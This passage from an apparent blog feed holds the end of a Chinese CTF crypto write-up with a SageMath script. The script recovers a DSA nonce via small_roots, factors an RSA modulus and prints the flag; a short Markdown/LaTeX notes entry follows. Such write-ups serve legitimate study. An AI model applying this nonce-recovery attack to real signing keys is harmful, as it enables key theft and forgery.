class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">步</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">有</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.08125em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></span></p><p>之后利用small_roots求解出k，然后正常解密出x就得到了msg中得e</p><p>之后得RSA需要利用C求出p和q，但是直接用sagemath中得two_squares得求出来得不是我们需要的，之后就找了个这个网站可以多个解，然后慢慢试：</p><p><a href="https://www.alpertron.com.ar/QUAD.HTM">Generic two integer variable equation solver</a></p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/imgs/GCB2024/1.png" alt="" /></div><div class="group-image-wrap"><img src="/imgs/GCB2024/2.png" alt="" /></div></div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>(H1, r1, s1) = <span class="hljs-number">659787401883545685817457221852854226644541324571</span>, <span class="hljs-number">334878452864978819061930997065061937449464345411</span>, <span class="hljs-number">282119793273156214497433603026823910474682900640</span><br>(H2, r2, s2) = <span class="hljs-number">156467414524100313878421798396433081456201599833</span>, <span class="hljs-number">584114556699509111695337565541829205336940360354</span>, <span class="hljs-number">827371522240921066790477048569787834877112159142</span><br><br>p = <span class="hljs-number">149328490045436942604988875802116489621328828898285420947715311349436861817490291824444921097051302371708542907256342876547658101870212721747647670430302669064864905380294108258544172347364992433926644937979367545128905469215614628012983692577094048505556341118385280805187867314256525730071844236934151633203</span><br>q = <span class="hljs-number">829396411171540475587755762866203184101195238207</span><br>g = <span class="hljs-number">87036604306839610565326489540582721363203007549199721259441400754982765368067012246281187432501490614633302696667034188357108387643921907247964850741525797183732941221335215366182266284004953589251764575162228404140768536534167491117433689878845912406615227673100755350290475167413701005196853054828541680397</span><br><br>x=(H1*r2-H2*r1)%q<br><br>PR.&lt;k&gt;=PolynomialRing(Zmod(q))<br>f=s1*r2*k-s2*r1*k^<span class="hljs-number">2</span>-x<br>f=f.monic()<br>k=<span class="hljs-built_in">int</span>(f.small_roots(X=<span class="hljs-number">2</span>**<span class="hljs-number">64</span>, beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.01</span>)[<span class="hljs-number">0</span>])<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(((s1*k-H1)*inverse(r1,q))%q)))<br><span class="hljs-comment">#b&#x27;e = 44519&#x27;</span><br>c = <span class="hljs-number">18947793008364154366082991046877977562448549186943043756326365751169362247521</span><br>C = <span class="hljs-number">179093209181929149953346613617854206675976823277412565868079070299728290913658</span><br><br>p=<span class="hljs-number">302951519846417861008714825074296492447</span><br>q=<span class="hljs-number">295488723650623654106370451762393175957</span><br>e = <span class="hljs-number">44519</span><br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=inverse_mod(e,phi)<br>m=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;D0g3xGC&#123;EZ_DSA_@nd_C0mplex_QAQ&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>RSA</tag>
      
      <tag>Curve</tag>
      
      <tag>DSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录Markdown的一些写法</title>
    <link href="/2024/12/05/markdown/"/>
    <url>/2024/12/05/markdown/</url>
    
    <content type="html"><![CDATA[<p>本篇用来记录写markdown时遇到的问题</p><h1 id="latex"><a class="markdownIt-Anchor" href="#latex"></a> LaTex</h1><blockquote><p>参考: <a href="https://blog.csdn.net/wzk4869/article/details/126863936">https://blog.csdn.net/wzk4869/article/details/126863936</a></p></blockquote><h2 id="希腊字母"><a class="markdownIt-Anchor" href="#希腊字母"></a> 希腊字母</h2><p><img src="/imgs/markdown/1.png" alt="" /></p><h2 id="数学结构"><a class="markdownIt-Anchor" href="#数学结构"></a> 数学结构</h2><p><img src="/imgs/markdown/2.png" alt="" /></p><h2 id="大符号"><a class="markdownIt-Anchor" href="#大符号"></a> 大符号</h2><p><img src="/imgs/markdown/3.png" alt="" /></p><h2 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h2><p><img src="/imgs/markdown/4.png" alt="" /></p><h2 id="运算符号"><a class="markdownIt-Anchor" href="#运算符号"></a> 运算符号</h2><p><img src="/imgs/markdown/5.png" alt="" /></p><h2 id="箭头符号"><a class="markdownIt-Anchor" href="#箭头符号"></a> 箭头符号</h2><p><img src="/imgs/markdown/6.png" alt="" /></p><h2 id="矩阵"><a class="markdownIt-Anchor" href="#矩阵"></a> 矩阵</h2><h3 id="无括号"><a class="markdownIt-Anchor" href="#无括号"></a> 无括号</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>matrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>matrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6000000000000005em;vertical-align:-1.5500000000000007em;"></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><h3 id="中括号"><a class="markdownIt-Anchor" href="#中括号"></a> 中括号</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">$$<br>\begin<span class="hljs-punctuation">&#123;</span>bmatrix<span class="hljs-punctuation">&#125;</span><br><span class="hljs-number">0</span><span class="hljs-variable">&amp;1</span><span class="hljs-variable">&amp;2</span>\\<br><span class="hljs-number">3</span><span class="hljs-variable">&amp;4</span><span class="hljs-variable">&amp;5</span>\\<br><span class="hljs-number">6</span><span class="hljs-variable">&amp;7</span><span class="hljs-variable">&amp;8</span>\\<br>\end<span class="hljs-punctuation">&#123;</span>bmatrix<span class="hljs-punctuation">&#125;</span><br>$$<br></code></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}0&amp;1&amp;2\\3&amp;4&amp;5\\6&amp;7&amp;8\\\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span 